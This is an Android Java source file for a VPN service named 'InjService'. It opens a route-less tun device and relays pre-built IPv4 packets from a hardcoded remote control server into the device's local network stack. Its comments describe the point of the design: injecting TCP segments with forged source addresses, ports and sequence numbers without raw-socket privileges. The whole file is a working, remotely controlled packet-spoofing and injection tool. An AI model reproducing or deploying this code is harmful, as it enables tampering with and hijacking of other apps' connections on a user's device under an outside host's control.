package com.inj;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.InetSocketAddress;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Owns a tun device and relays pre-built IPv4 packets from the control server
 * into it.
 *
 * Deliberately adds no routes. A route over the tunnel subnet would make the
 * kernel treat traffic addressed to the tunnel endpoint as tunnel traffic and
 * hand it to the read side of the tun instead of delivering it locally. With no
 * route the endpoint stays a plain local address, so a packet written here is
 * processed by ip_rcv and delivered to the local socket exactly as if it had
 * arrived on a physical interface.
 *
 * That gives us TCP segments with an arbitrary source address, source port and
 * sequence number without CAP_NET_RAW on this device.
 */
public class InjService extends VpnService {

    static final String ACTION_START = "com.inj.START";
    static final String ACTION_STOP = "com.inj.STOP";

    private static final String TAG = "InjService";

    private static final String TUN_ADDRESS = "10.7.7.1";
    private static final int TUN_PREFIX = 24;
    private static final int TUN_MTU = 1500;

    private static final String CLOUD_HOST = "5.180.98.79";
    private static final int CLOUD_PORT = 45700;
    private static final int CONNECT_TIMEOUT_MS = 10000;

    private static final int MAX_PACKET = 4096;
    private static final int ACK_BYTE = 0x06;

    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "inj";

    private final AtomicBoolean running = new AtomicBoolean(false);

    private ParcelFileDescriptor tun;
    private Thread pump;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent == null ? null : intent.getAction();

        if (ACTION_STOP.equals(action)) {
            stopAll();
            stopSelf();
            return START_NOT_STICKY;
        }

        startForeground(NOTIFICATION_ID, buildNotification());

        if (running.compareAndSet(false, true)) {
            pump = new Thread(this::pumpLoop, "tun-pump");
            pump.setDaemon(true);
            pump.start();
        }
        return START_STICKY;
    }

    private void pumpLoop() {
        Socket control = null;

        try {
            Builder builder = new Builder();
            builder.setSession("inj");
            builder.addAddress(TUN_ADDRESS, TUN_PREFIX);
            builder.setMtu(TUN_MTU);
            if (Build.VERSION.SDK_INT >= 29) {
                builder.setBlocking(true);
            }
            // No addRoute on purpose, see the class comment.

            tun = builder.establish();
            if (tun == null) {
                Log.e(TAG, "establish returned null: no consent, or another VPN is active");
                return;
            }
            Log.i(TAG, "tun up, fd=" + tun.getFd() + ", address " + TUN_ADDRESS
                    + "/" + TUN_PREFIX + ", no routes");

            OutputStream sink = new FileOutputStream(tun.getFileDescriptor());

            control = new Socket();
            control.connect(new InetSocketAddress(CLOUD_HOST, CLOUD_PORT), CONNECT_TIMEOUT_MS);
            control.setTcpNoDelay(true);

            InputStream frame = control.getInputStream();
            OutputStream ack = control.getOutputStream();
            Log.i(TAG, "control channel established");

            byte[] lengthField = new byte[4];
            byte[] packet = new byte[MAX_PACKET];

            while (running.get()) {
                if (!readFully(frame, lengthField, 4)) {
                    Log.w(TAG, "control channel closed");
                    break;
                }

                int length = ((lengthField[0] & 0xff) << 24)
                        | ((lengthField[1] & 0xff) << 16)
                        | ((lengthField[2] & 0xff) << 8)
                        | (lengthField[3] & 0xff);

                if (length < 20 || length > MAX_PACKET) {
                    Log.w(TAG, "rejecting frame with length " + length);
                    break;
                }

                if (!readFully(frame, packet, length)) {
                    break;
                }

                sink.write(packet, 0, length);
                sink.flush();

                ack.write(ACK_BYTE);
                ack.flush();
            }
        } catch (Exception e) {
            Log.e(TAG, "pump stopped", e);
        } finally {
            closeQuietly(control);
            stopAll();
            running.set(false);
        }
    }

    private static boolean readFully(InputStream in, byte[] dst, int count) throws Exception {
        int offset = 0;
        while (offset < count) {
            int n = in.read(dst, offset, count - offset);
            if (n <= 0) {
                return false;
            }
            offset += n;
        }
        return true;
    }

    private void stopAll() {
        closeQuietly(tun);
        tun = null;
    }

    private static void closeQuietly(AutoCloseable c) {
        if (c == null) {
            return;
        }
        try {
            c.close();
        } catch (Exception ignored) {
        }
    }

    private Notification buildNotification() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Tunnel", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
            b = new Notification.Builder(this, CHANNEL_ID);
        } else {
            b = new Notification.Builder(this);
        }

        return b.setContentTitle("Inj tunnel")
                .setContentText(TUN_ADDRESS + "/" + TUN_PREFIX)
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        stopAll();
        super.onDestroy();
    }
}